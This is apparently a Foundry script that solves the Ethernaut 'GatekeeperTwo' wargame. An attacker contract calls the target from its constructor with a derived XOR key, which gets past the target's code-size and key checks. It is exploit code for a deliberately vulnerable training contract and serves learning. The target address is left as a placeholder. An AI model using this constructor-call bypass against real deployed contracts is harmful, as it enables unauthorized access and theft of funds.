// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/14_GatekeeperTwo.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        GatekeeperTwoAttacker attacker = new GatekeeperTwoAttacker(your_challenge_address);    

        vm.stopBroadcast();
    }
}

contract GatekeeperTwoAttacker {

    constructor(address _target) {
        uint64 key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        (bool result,) = _target.call(abi.encodeWithSignature("enter(bytes8)",bytes8(key)));
    }
}